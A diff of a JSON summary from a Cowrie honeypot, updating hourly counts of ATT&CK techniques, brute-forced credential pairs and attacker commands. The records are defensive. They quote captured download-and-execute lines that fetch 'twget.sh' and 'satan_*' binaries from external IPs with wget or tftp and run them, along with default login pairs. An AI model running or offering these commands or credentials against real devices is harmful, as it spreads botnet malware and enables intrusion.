@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-20 09:03:45",
+  "generated": "2026-08-20 10:04:11",
   "totals": {
-    "commands": 489,
-    "login_failed": 1225,
-    "login_success": 51,
-    "sessions": 1347
+    "commands": 497,
+    "login_failed": 1247,
+    "login_success": 52,
+    "sessions": 1376
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1225,
+      "count": 1247,
       "examples": [
         "nginx / 150.136.155.47",
         "tyre / tyre",
@@ -21,14 +21,14 @@
         "tyre / tyre1234"
       ],
       "first": "2026-08-20T00:02:12.859219Z",
-      "last": "2026-08-20T09:00:51.265947Z",
-      "unique_ips": 46
+      "last": "2026-08-20T10:01:55.098978Z",
+      "unique_ips": 48
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 60,
+      "count": 61,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/satan_mips; chmod 777 satan_mips; ./sat",
@@ -37,14 +37,14 @@
         "wget http://31.77.227.121/satan_mips_el; chmod 777 satan_mips_el; ./satan_mips_el; rm -rf satan_mips_el"
       ],
       "first": "2026-08-20T01:21:21.761677Z",
-      "last": "2026-08-20T08:56:39.767502Z",
-      "unique_ips": 7
+      "last": "2026-08-20T09:45:52.945942Z",
+      "unique_ips": 8
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 51,
+      "count": 52,
       "examples": [
         "admin / switch",
         "admin / admin",
@@ -53,14 +53,14 @@
         "enable\\x00 / system\\x00"
       ],
       "first": "2026-08-20T01:07:19.606932Z",
-      "last": "2026-08-20T09:00:51.379651Z",
-      "unique_ips": 33
+      "last": "2026-08-20T09:45:52.230421Z",
+      "unique_ips": 34
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 42,
+      "count": 44,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "http://2.26.136.128/twget.sh",
@@ -69,8 +69,8 @@
         "wget http://31.77.227.121/satan_arm; chmod 777 satan_arm; ./satan_arm; rm -rf satan_arm"
       ],
       "first": "2026-08-20T01:10:19.623993Z",
-      "last": "2026-08-20T08:56:39.767502Z",
-      "unique_ips": 8
+      "last": "2026-08-20T09:45:53.885080Z",
+      "unique_ips": 9
     },
     {
       "id": "T1082",
@@ -226,7 +226,7 @@
     ],
     [
       "sh",
-      11
+      12
     ],
     [
       "zalee",
@@ -242,15 +242,15 @@
     ],
     [
       "enable",
-      6
+      7
     ],
     [
       "system",
-      6
+      7
     ],
     [
       "shell",
-      6
+      7
     ],
     [
       "linuxshell",
@@ -273,6 +273,18 @@
       4
     ],
     [
+      "ping; sh",
+      2
+    ],
+    [
+      "/bin/busybox STC",
+      2
+    ],
+    [
+      "/bin/busybox hostname TOASTER",
+      2
+    ],
+    [
       "busybox",
       2
     ],
@@ -283,18 +295,6 @@
     [
       "locate D877F783D5D3EF8Cs",
       2
-    ],
-    [
-      "echo Hi | cat -n",
-      2
-    ],
-    [
-      "/bin/busybox echo > /tmp/.fxcat && sh /tmp/.fxcat && cd /tmp/",
-      1
-    ],
-    [
-      "/bin/busybox echo > /var/.fxcat && sh /var/.fxcat && cd /var/",
-      1
     ]
   ]
 }
